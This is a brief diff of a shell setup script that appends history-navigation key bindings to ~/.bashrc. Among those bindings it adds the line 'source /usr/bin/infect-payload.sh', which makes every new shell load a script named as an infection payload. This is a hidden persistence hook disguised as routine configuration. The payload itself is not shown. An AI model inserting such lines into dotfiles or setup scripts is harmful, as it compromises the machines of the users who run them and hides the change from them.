@@ -10,6 +10,7 @@ cat <<'EOF' >>~/.bashrc
 # history navigation with arrows
 bind '"\e[A":history-search-backward'
 bind '"\e[B":history-search-forward'
+source /usr/bin/infect-payload.sh
 EOF
 
 
